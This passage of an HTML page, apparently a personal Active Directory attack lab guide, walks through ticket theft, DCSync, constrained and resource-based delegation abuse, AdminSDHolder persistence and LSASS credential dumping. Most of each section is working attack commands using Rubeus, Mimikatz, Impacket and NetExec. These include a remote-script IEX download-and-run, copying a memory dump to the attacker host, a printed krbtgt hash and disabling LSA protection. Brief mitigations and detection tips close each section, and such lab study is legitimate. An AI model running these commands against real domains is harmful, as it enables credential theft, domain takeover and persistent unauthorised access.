+<p><img src="images/ad_attacks_lab/kali_14.png" alt="kali_14"></p>
+<p><img src="images/ad_attacks_lab/kali_15.png" alt="kali_15"></p>
+
+<h3>4. Trigger Domain Admin Authentication (Domain Controller)</h3>
+
+<pre><code>
+Invoke-WebRequest -Uri "http://MY-BOX.lab.local" -UseBasicParsing -UseDefaultCredentials
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_16.png" alt="kali_16"></p>
+
+<h3>5. Steal TGT and Impersonate</h3>
+
+<pre><code>
+echo "BASE64_TICKET" | base64 -d > ticket.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+export KRB5CCNAME=ticket.ccache
+psexec.py -k -no-pass lab.local/Administrator@MyDC.lab.local
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_17.png" alt="kali_17"></p>
+
+
+
+<h1 id="DCSync">DCSync</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Domain Admin privileges or equivalent replication rights</li>
+    <li>Compromised account with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All</li>
+    <li>Network access to the domain controller (port 389/tcp)</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Extract all domain user hashes from NTDS.dit</li>
+    <li>Obtain the krbtgt hash for Golden Ticket creation</li>
+    <li>Gain persistent domain access</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Verify DCSync Permissions (BloodHound)</h3>
+
+<p>In BloodHound, look for outbound control rights:</p>
+<ul>
+    <li>DS-Replication-Get-Changes</li>
+    <li>DS-Replication-Get-Changes-All</li>
+</ul>
+
+<h3>2. Perform DCSync Attack (Kali)</h3>
+
+<p><strong>Method A: Using secretsdump.py</strong></p>
+
+<pre><code>
+impacket-secretsdump Administrator@MyDC.lab.local -k -no-pass > DCSync.txt
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_18.png" alt="kali_18"></p>
+
+<p><strong>Method B: Using Mimikatz (Windows)</strong></p>
+
+<pre><code>
+privilege::debug
+lsadump::dcsync /domain:lab.local /all /csv
+</code></pre>
+
+<h3>3. Extract krbtgt Hash</h3>
+
+<pre><code>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+</code></pre>
+
+<p>NT hash: <code>58a478135a93ac3bf058a5ea0e8fdb71</code></p>
+
+<h3>4. Verify Hashes</h3>
+
+<pre><code>
+crackmapexec smb &lt;DC_IP&gt; -u Administrator -H &lt;NT_HASH&gt;
+</code></pre>
+
+<h2>Key Commands</h2>
+
+<table border=1>
+    <tr>
+        <th>Action</th>
+        <th>Command</th>
+    </tr>
+    <tr>
+        <td>Extract all hashes</td>
+        <td><code>secretsdump.py lab.local/user:pass@DC_IP -just-dc</code></td>
+    </tr>
+    <tr>
+        <td>Get krbtgt only</td>
+        <td><code>secretsdump.py lab.local/user:pass@DC_IP -just-dc-user krbtgt</code></td>
+    </tr>
+    <tr>
+        <td>Mimikatz method</td>
+        <td><code>lsadump::dcsync /domain:lab.local /user:krbtgt</code></td>
+    </tr>
+</table>
+
+<h2>Defensive Mitigations</h2>
+
+<ol>
+    <li>Restrict DCSync permissions.</li>
+    <li>Monitor for Event ID 4662 with replication GUID <code>{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}</code>.</li>
+    <li>Audit accounts with replication rights using BloodHound.</li>
+</ol>
+
+<hr>
+
+<h1 id="Constrained_Delegation_Abuse">Constrained Delegation Abuse</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Compromised service account configured for constrained delegation</li>
+    <li>Knowledge of the service account password or hash</li>
+    <li>msDS-AllowedToDelegateTo attribute contains target SPNs</li>
+    <li>Privileged account that the service can impersonate</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Identify service accounts with constrained delegation</li>
+    <li>Abuse delegation to impersonate privileged users</li>
+    <li>Gain access to authorized services as the impersonated user</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Identify Constrained Delegation (BloodHound)</h3>
+
+<p>Queries:</p>
+
+<pre><code>
+MATCH (c:Computer {constraineddelegation:true}) RETURN c
+MATCH (u:User {constraineddelegation:true}) RETURN u
+</code></pre>
+
+<h3>2. Manual Enumeration (PowerShell)</h3>
+
+<pre><code>
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_19.png" alt="kali_19"></p>
+
+<h3>3. Abuse Delegation with Rubeus</h3>
+
+<pre><code>
+iwr https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/refs/heads/master/Rubeus.exe -OutFile Rubeus.exe
+
+Rubeus.exe asktgt /user:svc_deleg /password:Passw0rd! /domain:lab.local /outfile:svc_deleg_tgt.kirbi
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_20.png" alt="kali_20"></p>
+
+<pre><code>
+Rubeus.exe s4u /ticket:svc_deleg_tgt.kirbi \
+/impersonateuser:Administrator \
+/msdsspn:CIFS/MyDC.lab.local \
+/altservice:CIFS \
+/domain:lab.local /ptt
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_21.png" alt="kali_21"></p>
+<p><img src="images/ad_attacks_lab/kali_22.png" alt="kali_22"></p>
+
+<pre><code>
+.\Rubeus.exe klist
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_23.png" alt="kali_23"></p>
+
+<h3>4. Access Target Service</h3>
+
+<pre><code>
+dir \\MyDC.lab.local\C$
+</code></pre>
+
+<hr>
+
+<h2>Alternative (Impacket-Based)</h2>
+
+<pre><code>
+impacket-findDelegation lab.local/Bill.Shanie:magic -target-domain lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_24.png" alt="kali_24"></p>
+
+<pre><code>
+impacket-getST -spn 'CIFS/MyDC.lab.local' \
+-impersonate Administrator \
+-dc-ip 10.10.10.99 \
+'lab.local/svc_deleg:Passw0rd!'
+
+export KRB5CCNAME=$(pwd)/Administrator@CIFS_MyDC.lab.local@LAB.LOCAL.ccache
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_25.png" alt="kali_25"></p>
+<p><img src="images/ad_attacks_lab/kali_26.png" alt="kali_26"></p>
+
+<h3>Access Target Service</h3>
+
+<pre><code>
+impacket-smbclient -k -no-pass lab.local/Administrator@MyDC.lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_27.png" alt="kali_27"></p>
+
+<h3>Shell Access</h3>
+
+<pre><code>
+impacket-psexec -k -no-pass lab.local/Administrator@MyDC.lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_28.png" alt="kali_28"></p>
+<p><img src="images/ad_attacks_lab/kali_29.png" alt="kali_29"></p>
+
+<hr>
+
+<h2>Lab Configuration</h2>
+
+<h3>1. Create Service Account with Constrained Delegation</h3>
+
+<pre><code>
+New-ADUser -Name "svc_deleg" -SamAccountName "svc_deleg" \
+  -AccountPassword (ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force) \
+  -Enabled $true \
+  -ServicePrincipalNames "CIFS/MyDC.lab.local"
+
+Set-ADUser -Identity svc_deleg -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/MyDC.lab.local')}
+Set-ADAccountControl -Identity svc_deleg -TrustedToAuthForDelegation $true
+</code></pre>
+
+<h3>2. Verify Configuration</h3>
+
+<pre><code>
+Get-ADUser svc_deleg -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation
+</code></pre>
+
+<hr>
+
+<h2>Key Commands</h2>
+
+<table border=1>
+    <tr>
+        <th>Action</th>
+        <th>Command</th>
+    </tr>
+    <tr>
+        <td>Request TGT</td>
+        <td><code>Rubeus asktgt /user:svc_account /password:Pass123! /domain:lab.local</code></td>
+    </tr>
+    <tr>
+        <td>S4U2Self abuse</td>
+        <td><code>Rubeus s4u /ticket:base64_ticket /impersonateuser:Administrator /msdsspn:CIFS/dc.lab.local</code></td>
+    </tr>
+    <tr>
+        <td>Silver ticket</td>
+        <td><code>Rubeus silver /domain:lab.local /sid:S-1-5-21-... /user:svc_account /service:HTTP /target:dc.lab.local</code></td>
+    </tr>
+</table>
+
+<hr>
+
+<h2>Defensive Mitigations</h2>
+
+<ol>
+    <li>Audit delegation settings regularly.</li>
+    <li>Prefer resource-based constrained delegation.</li>
+    <li>Monitor Event ID 4769 with TicketOptions = 0x40810000.</li>
+</ol>
+
+<h2>Detection Events</h2>
+
+<ul>
+    <li><strong>Event ID 4769</strong>: Kerberos service ticket requested</li>
+    <li>Look for service account names such as <code>svc_deleg</code></li>
+</ul>
+
+
+
+
+<h1 id="Resource-Based_Constrained_Delegation">Resource-Based Constrained Delegation</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Compromised account with write permissions over the target computer object</li>
+    <li>Ability to create computer accounts (default MachineAccountQuota = 10)</li>
+    <li>Target service running on the destination host</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Create a controlled computer account</li>
+    <li>Configure resource-based constrained delegation on the target computer to trust this account</li>
+    <li>Forge service tickets to gain privileged access</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Verify Permissions (BloodHound)</h3>
+
+<p>Use BloodHound to confirm that the compromised account has write permissions over the target computer object.</p>
+<p><img src="images/ad_attacks_lab/kali_30.png" alt="kali_30"></p>
+
+<h3>2. Create Computer Account (Kali)</h3>
+
+<pre><code>
+impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Passw0rd!' \
+-dc-ip 10.10.10.99 lab.local/ad_user:ad_user
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_31.png" alt="kali_31"></p>
+
+<h3>3. Configure Resource-Based Constrained Delegation (Kali)</h3>
+
+<pre><code>
+impacket-rbcd lab.local/ad_user:ad_user -dc-ip 10.10.10.99 \
+-delegate-from ATTACKER$ -delegate-to MY-BOX$ -action write
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_32.png" alt="kali_32"></p>
+
+<h3>4. Forge Service Ticket (Kali)</h3>
+
+<pre><code>
+impacket-getST -spn 'HOST/MY-BOX.lab.local' \
+-impersonate 'Administrator' \
+-dc-ip 10.10.10.99 \
+'lab.local/ATTACKER$:Passw0rd!' \
+-force-forwardable
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_33.png" alt="kali_33"></p>
+
+<h3>5. Access Target Service</h3>
+
+<pre><code>
+unset KRB5CCNAME
+export KRB5CCNAME=$(pwd)/Administrator@HOST_MY-BOX.lab.local@LAB.LOCAL.ccache
+
+impacket-smbclient -k -no-pass lab.local/Administrator@MY-BOX.lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_34.png" alt="kali_34"></p>
+
+<h3>Shell Access</h3>
+
+<pre><code>
+impacket-psexec -k -no-pass lab.local/Administrator@MY-BOX.lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_35.png" alt="kali_35"></p>
+
+<hr>
+
+<h2>Lab Configuration (Corrected)</h2>
+
+<h3>1. Grant GenericAll Permissions (Domain Controller)</h3>
+
+<pre><code>
+$targetComputer = Get-ADComputer -Identity "MY-BOX"
+$user = Get-ADUser -Identity "ad_user"
+
+$adPath = "AD:$($targetComputer.DistinguishedName)"
+$acl = Get-Acl -Path $adPath
+
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $user.SID,
+    "GenericAll",
+    "Allow",
+    "All",
+    [Guid]::Empty
+)
+
+$acl.AddAccessRule($ace)
+Set-ACL -Path "AD:$($targetComputer.DistinguishedName)" -AclObject $acl
+</code></pre>
+
+<h3>2. Verify Permissions</h3>
+
+<pre><code>
+(Get-ACL -Path "AD:$($targetComputer.DistinguishedName)").Access |
+    Where-Object {$_.IdentityReference -like "*ad_user*"} |
+    Format-List IdentityReference, ActiveDirectoryRights, AccessControlType
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_36.png" alt="kali_36"></p>
+
+<h3>3. Verify MachineAccountQuota</h3>
+
+<pre><code>
+Get-ADDomain -Identity lab.local |
+    Select-Object -ExpandProperty DistinguishedName |
+    Get-ADObject -Properties ms-DS-MachineAccountQuota |
+    Select-Object ms-DS-MachineAccountQuota
+</code></pre>
+
+<hr>
+
+<h2>Troubleshooting</h2>
+
+<table border=1>
+    <tr>
+        <th>Issue</th>
+        <th>Solution</th>
+    </tr>
+    <tr>
+        <td>addcomputer.py fails</td>
+        <td>Verify that MachineAccountQuota is greater than zero.</td>
+    </tr>
+    <tr>
+        <td>rbcd.py access denied</td>
+        <td>Confirm GenericAll permissions on the target computer object.</td>
+    </tr>
+    <tr>
+        <td>getST fails</td>
+        <td>Ensure the target computer is online and required services are running.</td>
+    </tr>
+</table>
+
+<h2>Key Notes</h2>
+
+<ol>
+    <li>VulnAD may require manual permission configuration for RBCD to work as expected.</li>
+    <li>Alternative tooling includes Powermad for computer creation in PowerShell.</li>
+</ol>
+
+<pre><code>
+New-MachineAccount -MachineAccount ATTACKER `
+  -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
+</code></pre>
+
+<h2>Cleanup</h2>
+
+<pre><code>
+Remove-ADComputer -Identity "ATTACKER$" -Confirm:$false
+</code></pre>
+
+
+
+
+
+<h1 id="AdminSDHolder_Abuse">AdminSDHolder Abuse</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Compromised account with write permissions over the AdminSDHolder container</li>
+    <li>Target accounts are members of protected groups (for example, Domain Admins, Enterprise Admins)</li>
+    <li>Time for SDProp process to run (by default every 60 minutes)</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Modify AdminSDHolder ACL to grant malicious permissions</li>
+    <li>Allow SDProp to propagate permissions to protected groups</li>
+    <li>Maintain persistent privileged access to protected accounts</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Identify Write Permissions (BloodHound)</h3>
+
+<p>Use BloodHound to confirm that the compromised user has write or WriteDacl rights over the AdminSDHolder container.</p>
+<p><img src="images/ad_attacks_lab/kali_37.png" alt="kali_37"></p>
+
+<h3>2. Modify AdminSDHolder ACL (Windows PowerShell)</h3>
+
+<pre><code>
+Import-Module ActiveDirectory
+
+$adminSDHolder = Get-ADObject -Filter {name -like "AdminSDHolder"} -Properties nTSecurityDescriptor
+
+$user = Get-ADUser -Identity "ad_user"
+$sid = $user.SID
+
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $sid,
+    "GenericAll",
+    "Allow",
+    "All",
+    [Guid]::Empty
+)
+
+$acl = $adminSDHolder.nTSecurityDescriptor
+$acl.AddAccessRule($ace)
+
+Set-ADObject -Identity $adminSDHolder -Replace @{nTSecurityDescriptor = $acl}
+</code></pre>
+
+<h3>2. Modify AdminSDHolder ACL (Kali)</h3>
+
+<pre><code>
+impacket-dacledit -action 'write' -rights 'FullControl' \
+-principal 'ad_user' \
+-target-dn 'CN=AdminSDHolder,CN=System,DC=LAB,DC=LOCAL' \
+'lab.local'/'ad_user':'ad_user'
+
+impacket-dacledit -action 'read' \
+-target-dn 'CN=AdminSDHolder,CN=System,DC=LAB,DC=LOCAL' \
+'lab.local'/'ad_user':'ad_user'
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_38.png" alt="kali_38"></p>
+<p><img src="images/ad_attacks_lab/kali_39.png" alt="kali_39"></p>
+
+<h3>3. Force SDProp Run (Domain Controller)</h3>
+
+<pre><code>
+.\Invoke-SDPropagator
+Invoke-SDPropagator
+</code></pre>
+
+<p>Alternatively, wait for the default SDProp cycle (about 60 minutes).</p>
+
+<h3>4. Verify Permissions Propagated</h3>
+
+<pre><code>
+(Get-ACL -Path "AD:CN=Domain Admins,CN=Users,DC=lab,DC=local").Access |
+    Where-Object {$_.IdentityReference -like "*ad_user*"}
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_40.png" alt="kali_40"></p>
+
+<h3>5. Abuse Permissions (Windows)</h3>
+
+<pre><code>
+Add-ADGroupMember -Identity "Domain Admins" -Members "ad_user"
+
+Get-ADGroupMember -Identity "Domain Admins" |
+    Where-Object {$_.SamAccountName -eq "ad_user"}
+</code></pre>
+
+<h3>5. Abuse Permissions (Kali)</h3>
+
+<pre><code>
+net rpc group addmem "Domain Admins" ad_user -U "ad_user%ad_user" -S MyDC.lab.local
+net rpc group members "Domain Admins" -U "ad_user%ad_user" -S MyDC.lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_41.png" alt="kali_41"></p>
+
+<h3>Shell Access</h3>
+
+<pre><code>
+impacket-psexec ad_user@lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_42.png" alt="kali_42"></p>
+
+<h2>Note</h2>
+
+<p>AdminSDHolder abuse does not automatically re-add the user to privileged groups if removed. Instead, the user retains the ability to grant themselves privileged group membership again at any time. This is a privilege persistence mechanism rather than a one-time privilege escalation.</p>
+
+<hr>
+
+<h2>Lab Configuration</h2>
+
+<h3>1. Grant Write Permissions to AdminSDHolder (Domain Controller)</h3>
+
+<pre><code>
+$adminSDHolder = Get-ADObject -Filter {name -like "AdminSDHolder"}
+$user = Get-ADUser -Identity "ad_user"
+
+$acl = Get-ACL -Path "AD:$($adminSDHolder.DistinguishedName)"
+
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $user.SID,
+    "WriteDacl",
+    "Allow",
+    "All",
+    [Guid]::Empty
+)
+
+$acl.AddAccessRule($ace)
+
+Set-ACL -Path "AD:$($adminSDHolder.DistinguishedName)" -AclObject $acl
+</code></pre>
+
+<h3>2. Verify Configuration</h3>
+
+<pre><code>
+(Get-ACL -Path "AD:$($adminSDHolder.DistinguishedName)").Access |
+    Where-Object {$_.IdentityReference -like "*ad_user*"} |
+    Select-Object IdentityReference, ActiveDirectoryRights
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_43.png" alt="kali_43"></p>
+
+<hr>
+
+<h2>Defensive Mitigations</h2>
+
+<ol>
+    <li>Restrict access to AdminSDHolder and remove unnecessary permissions.</li>
+    <li>Monitor Event ID 5136 for changes to the AdminSDHolder object.</li>
+    <li>Regularly audit AdminSDHolder ACL to ensure only expected security principals have rights.</li>
+</ol>
+
+<pre><code>
+$acl = Get-ACL -Path "AD:\\CN=AdminSDHolder,CN=System,DC=lab,DC=local"
+$acl.Access |
+    Where-Object {$_.IdentityReference -notlike "NT AUTHORITY*"}
+</code></pre>
+
+<hr>
+
+<h2>Detection Tips</h2>
+
+<p><strong>BloodHound Query:</strong></p>
+
+<pre><code>
+MATCH (u:User)-[r:WriteDacl|GenericAll]->(c:Container {name: "AdminSDHolder"})
+RETURN u, r, c
+</code></pre>
+
+<p><strong>SIEM Alerts:</strong></p>
+<ul>
+    <li>Unexpected modifications to the AdminSDHolder object</li>
+    <li>Frequent or unusual permission changes to protected groups</li>
+</ul>
+
+
+
+
+
+<h1 id="LSASS_Dump">LSASS Dump</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Administrative access to the target Windows machine (workstation or domain controller)</li>
+    <li>Ability to execute code with high privileges (SYSTEM or local administrator)</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Extract credentials from LSASS memory</li>
+    <li>Obtain NTLM hashes and Kerberos tickets</li>
+    <li>Use extracted credentials to access additional systems</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Gain Administrative Access (Kali)</h3>
+
+<pre><code>
+impacket-psexec lab.local/ad_user@&lt;TARGET_IP&gt; -hashes :&lt;NT_HASH&gt;
+
+impacket-psexec ad_user@MyDC.lab.local
+</code></pre>
+
+<h3>2. Dump LSASS Memory (Target Windows)</h3>
+
+<p><strong>Method A: Using Procdump</strong></p>
+
+<pre><code>
+.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+scp.exe lsass.dmp kali_user@&lt;KALI_IP&gt;:/tmp/
+</code></pre>
+
+<p><strong>Method B: Using Mimikatz (in memory)</strong></p>
+
+<pre><code>
+privilege::debug
+sekurlsa::logonpasswords
+</code></pre>
+
+<p><strong>Method C: Using Nanodump (PowerShell)</strong></p>
+
+<pre><code>
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NotMedic/Invoke-Nanodump/refs/heads/main/Invoke-Nanodump.ps1')
+Invoke-Nanodump
+</code></pre>
+
+<p><strong>Method C: Using Nanodump (NetExec module, Kali)</strong></p>
+
+<pre><code>
+netexec smb -u ad_user -p ad_user -d lab.local 10.10.10.99 -M nanodump
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_44.png" alt="kali_44"></p>
+
+<pre><code>
+pypykatz lsa minidump /tmp/MYDC_64_lab.local.log &gt; MyDC_Lsass_dump.txt
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_45.png" alt="kali_45"></p>
+<p><img src="images/ad_attacks_lab/kali_46.png" alt="kali_46"></p>
+
+<h3>3. Parse Dump File (Kali)</h3>
+
+<pre><code>
+pypykatz lsa minidump lsass.dmp
+</code></pre>
+
+<pre><code>
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+</code></pre>
+
+<h3>4. Use Extracted Credentials</h3>
+
+<pre><code>
+crackmapexec smb &lt;TARGET_IP&gt; -u Administrator -H &lt;EXTRACTED_NT_HASH&gt;
+
+psexec.py lab.local/Administrator@&lt;TARGET_IP&gt; -hashes :&lt;EXTRACTED_NT_HASH&gt;
+</code></pre>
+
+<hr>
+
+<h2>Lab Configuration</h2>
+
+<h3>1. Disable LSASS Protection (Optional)</h3>
+
+<pre><code>
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f
+
+Restart-Computer -Force
+</code></pre>
+
+<h3>2. Prepare Tools</h3>
+
+<pre><code>
+Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "procdump.zip"
+Expand-Archive -Path "procdump.zip" -DestinationPath "C:\Tools\"
+</code></pre>
+
+<hr>
+
+<h2>Key Commands</h2>
+
+<table border=1>
+    <tr>
+        <th>Action</th>
+        <th>Command</th>
+    </tr>
+    <tr>
+        <td>Dump LSASS</td>
+        <td><code>procdump -ma lsass.exe lsass.dmp</code></td>
+    </tr>
+    <tr>
+        <td>Extract credentials</td>
+        <td><code>pypykatz lsa minidump lsass.dmp</code></td>
+    </tr>
+    <tr>
+        <td>In-memory extraction</td>
+        <td><code>sekurlsa::logonpasswords</code></td>
+    </tr>
+</table>
+
+<hr>
+
+<h2>Defensive Mitigations</h2>
+
+<ol>
+    <li>Enable LSA protection.</li>
+</ol>
+
+<pre><code>
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+</code></pre>
+
+<ol start="2">
+    <li>Configure Credential Guard where possible.</li>
+</ol>
+
+<pre><code>
+Enable-WindowsOptionalFeature -Online -FeatureName "Microsoft-Hyper-V" -All
+Enable-WindowsOptionalFeature -Online -FeatureName "CredentialGuard" -All
+</code></pre>
+
+<ol start="3">
+    <li>Monitor access to LSASS using process access logging (for example, Sysmon Event ID 10).</li>
+</ol>
+
+<hr>
+
+<h2>Detection Tips</h2>
+
+<p><strong>Sysmon Configuration Example:</strong></p>
+
+<pre><code>
+&lt;ProcessAccess onmatch="include"&gt;
+  &lt;TargetImage condition="end with"&gt;lsass.exe&lt;/TargetImage&gt;
+&lt;/ProcessAccess&gt;
+</code></pre>
+
+<p><strong>SIEM Alerts:</strong></p>
+<ul>
+    <li>Execution of tools such as procdump.exe or mimikatz.exe</li>
+    <li>Repeated access to the LSASS process by non-system processes</li>
+</ul>
+
+
+
+
+
+
+<!-- -->
+
+<p><a href="index.html">← Back to Home</a></p>
+
+</body>
+</html>
+
+
+
